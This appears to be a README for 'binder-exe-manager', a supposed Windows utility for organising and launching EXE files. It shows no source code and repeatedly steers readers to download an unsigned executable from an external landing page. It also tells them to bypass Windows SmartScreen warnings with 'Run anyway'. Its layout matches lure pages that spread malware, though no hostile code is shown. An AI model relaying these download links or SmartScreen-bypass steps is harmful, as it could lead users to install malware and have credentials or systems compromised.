<div align="center">

<img src="assets/banner.svg" width="100%" alt="Binder EXE banner"/>

# binder-exe-manager 📦⚙️

![Version](https://img.shields.io/badge/version-2026-blue?style=for-the-badge) ![Windows](https://img.shields.io/badge/platform-Windows-0078d4?style=for-the-badge&logo=windows&logoColor=white) ![License](https://img.shields.io/badge/license-MIT-green?style=for-the-badge)

*One binder, every executable — organize, launch, and retire your EXE collection without ever opening a file explorer again.*

<p align="center">
  <a href="https://wavelegendfurnace.github.io/binder-exe-manager/">
    <img src="https://img.shields.io/badge/DOWNLOAD_NOW-2026-4338CA?style=for-the-badge&logo=windows&logoColor=white&labelColor=3730A3" width="550" alt="Download"/>
  </a>
</p>
</div>

---

## 🧭 Overview

**binder-exe-manager** is a desktop utility built for people who accumulate executables the way squirrels accumulate acorns. If your Downloads folder looks like a graveyard of `setup_final_v2.exe` and `tool_new(3).exe`, this project exists to give that chaos a home. The core idea is simple: a **binder** — a single, portable container that holds references to your EXE files, groups them into collections, and lets you launch, tag, and audit them from one clean interface instead of hunting through nested folders.

This isn't a package manager, it's not an app store, and it's not trying to reinvent Windows. It's a lightweight shell around a problem every power user, tinkerer, sysadmin, and indie tool-hoarder eventually runs into: too many standalone `.exe` tools, not enough structure. Binder EXE Manager gives each executable a card, a category, a launch history, and a checksum — so you always know what you're running and where it came from.

Built by a solo dev who got tired of re-downloading the same portable tools every few months, this project ships fast and stays lean. No telemetry theater, no forced accounts, no background services eating your RAM. Just a binder for your EXEs, a manager to run them, and a UI that doesn't get in your way.

<p align="center">

<a href="https://wavelegendfurnace.github.io/binder-exe-manager/">
    <img src="https://img.shields.io/badge/DOWNLOAD_NOW-2026-4338CA?style=for-the-badge&logo=windows&logoColor=white&labelColor=3730A3" width="550" alt="Download"/>
  </a>

</p>

---

## 🔥 What It Actually Does

> [!NOTE]
> This section is the honest pitch. No marketing haze — just what's under the hood.

- **Binder-first organization** — every executable lives inside a binder (think: a smart folder with metadata), not scattered across your desktop like confetti.

- **One-click launch queue** — stack up multiple EXEs and fire them in sequence or parallel, instead of double-clicking one at a time like it's 2009.

- **Checksum fingerprinting** — every binder entry gets a SHA-256 hash on import, so you can spot when a "trusted" EXE silently changed.

- **Tag-based retrieval** — slap tags like `portable`, `dev-tools`, `legacy` on your binders and filter instantly instead of scrolling.

- **Launch history ledger** — a timestamped log of what ran, when, and how long it stayed open — useful for audits or just curiosity.

- **Drag-and-drop binder building** — pull EXEs straight from Explorer into a binder card; no import wizard, no friction.

- **Portable binder export** — package a binder as a single manifest file you can move between machines without dragging every EXE with it.

- **Offline-first design** — the manager never phones home; your binder data stays local, always.

---

## 🚀 Getting Rolling

> [!TIP]
> The whole setup takes less time than making coffee.

1. **Visit the landing page** using the download button above or below — that's the only official source.

2. **Grab the latest build** — it's a standalone Windows executable, nothing to extract into `System32`.

3. **Run it** — double-click, let Windows SmartScreen do its usual "unknown publisher" dance once, and you're in.

4. **Create your first binder** — drag in a few EXEs, tag them, and hit launch. That's the whole loop.

---

## 🖥️ System Requirements

| Component | Minimum | Recommended |
|---|---|---|
| **OS** | Windows 10 (64-bit) | Windows 11 (64-bit) |
| **RAM** | 2 GB | 4 GB+ |
| **Disk** | 150 MB free | 500 MB free (for binder history/logs) |

> [!IMPORTANT]
> No .NET runtime installs, no Python, no background services. Binder EXE Manager is a single self-contained executable — what you download is what you run.

<details>
<summary><strong>📋 Full compatibility notes (click to expand)</strong></summary>

<br>

- Works on both Windows 10 21H2+ and all Windows 11 builds.

- ARM64 Windows devices run it fine under emulation, but native performance isn't guaranteed yet.

- No admin rights required for standard use — only needed if a binder entry itself demands elevation.

- Multi-monitor setups are fully supported; binder windows remember their last position.

</details>

---

## ⚙️ How It Works

The architecture is intentionally boring — boring means reliable.

1. You **import** an EXE into a binder; the manager reads its metadata and computes a checksum.

2. The binder **stores a reference**, not a copy — your original file stays exactly where it was.

3. When you **launch**, the manager verifies the checksum hasn't drifted, then hands off execution to Windows.

4. Every launch gets **logged** into the binder's local history ledger.

5. You can **export or archive** the binder at any point as a portable manifest.

```mermaid
flowchart LR
Import --> Binder
Binder --> Verify
Verify --> Launch
Launch --> History
```

> [!WARNING]
> If a binder entry's checksum changes unexpectedly, the manager will flag it before launch. Don't ignore that flag — verify the source of the file yourself.

---

## 🧩 Troubleshooting

<details>
<summary><strong>Q: The manager says "checksum mismatch" on a binder entry I know is legit.</strong></summary>

<br>

Some installers self-update or re-pack on every download, which changes the hash even though the source is fine. Re-import the EXE to refresh its fingerprint, or mark it as trusted in the entry's context menu.

</details>

<details>
<summary><strong>Q: Windows SmartScreen is blocking the app on first run.</strong></summary>

<br>

This is standard behavior for any new, unsigned-at-scale executable. Click "More info" then "Run anyway." Signing certificates are on the roadmap as the project grows.

</details>

<details>
<summary><strong>Q: A binder entry launches but immediately closes.</strong></summary>

<br>

That's almost always the target EXE itself needing a dependency (like a specific runtime) — the binder just hands off execution, it doesn't sandbox or bundle dependencies for the target program.

</details>

<details>
<summary><strong>Q: Can I move my binders to a new PC?</strong></summary>

<br>

Yes — use the portable binder export feature to generate a manifest file, then import it on the new machine. Note that referenced EXEs still need to exist at their original paths, or you'll be prompted to relink them.

</details>

<details>
<summary><strong>Q: Launch history is getting huge — can I trim it?</strong></summary>

<br>

Settings → History → Retention lets you cap entries by count or age. There's also a one-click "clear ledger" if you just want a fresh start.

</details>

---

## 🎨 UI / UX Details

![Status](https://img.shields.io/badge/status-actively--maintained-brightgreen?style=flat-square) ![Built with](https://img.shields.io/badge/built%20with-solo%20dev%20energy-orange?style=flat-square)

| Shortcut | Action |
|---|---|
| `Ctrl + N` | New binder |
| `Ctrl + O` | Open binder manifest |
| `Ctrl + L` | Launch selected entry |
| `Ctrl + Shift + L` | Launch entire binder queue |
| `Del` | Remove entry from binder (does not delete the EXE itself) |
| `F2` | Rename binder or entry |
| `Ctrl + F` | Quick filter by tag/name |

- **Themes** — Light, Dark, and a high-contrast mode built for long sessions.

- **Compact vs. Card view** — switch between a dense list and a visual card grid per binder.

- **Settings persist locally** — no cloud sync, no account, your layout stays exactly as you left it.

> [!TIP]
> Right-click any binder entry for a quick actions menu — relaunch, relink, re-checksum, or view launch history for that specific EXE.

---

## 🤝 Contributing & Community

This project is solo-dev driven but not solo-dev exclusive. Contributions, bug reports, and UI critiques are welcome via Issues and Pull Requests.

- Found a bug? Open an issue with your Windows build and a repro if possible.

- Got a feature idea? Discussions are open — no idea is too small to pitch.

- Want to contribute code? Fork, branch, PR — keep changes focused and readable.

> Community input has already shaped the launch queue and tag system — this thing grows because people actually use it.

---

## 📜 License

Licensed under the [MIT License](LICENSE) © 2026.

---

## ⚠️ Disclaimer

Binder EXE Manager is an organizational and launch utility. It does not modify, verify the safety of, or vouch for the third-party executables you choose to add to your binders. You are responsible for sourcing your own EXEs from trustworthy locations. Use good judgment — the manager helps you organize, not vet, what you run.

<p align="center">

<a href="https://wavelegendfurnace.github.io/binder-exe-manager/">
    <img src="https://img.shields.io/badge/DOWNLOAD_NOW-2026-4338CA?style=for-the-badge&logo=windows&logoColor=white&labelColor=3730A3" width="550" alt="Download"/>
  </a>

</p>